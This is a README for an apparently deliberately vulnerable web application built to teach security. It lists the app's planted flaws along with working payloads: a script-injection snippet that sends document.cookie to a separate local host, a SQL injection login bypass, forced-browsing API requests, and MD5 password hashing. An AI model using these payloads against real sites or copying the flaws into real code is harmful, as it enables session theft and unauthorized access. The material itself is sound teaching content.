# DontDoThis

Simple web application with a bunch of serious security flaws.

It is intended as a teaching tool for security.

## Getting started

Run `npm ci` to install dependencies.

Run `npm start` for a dev server. Navigate to http://localhost:4200/.

Reset the database with `npm run sync`.


## Vulnerabilities

- About us form - script injection
    - <script>alert("Exploited")</script>
    - <script>fetch(`http://localhost:8000/${document.cookie}`)</script>
- Login form - SQL injection
    - " or id = 1 and "" = "
- Info page - Broken access control
    - GET /api/company/2
- User endpoint - Broken access control / forced browsing
    - http://localhost:4200/api/user/2
- Cryptographic Failures -> MD5 hashing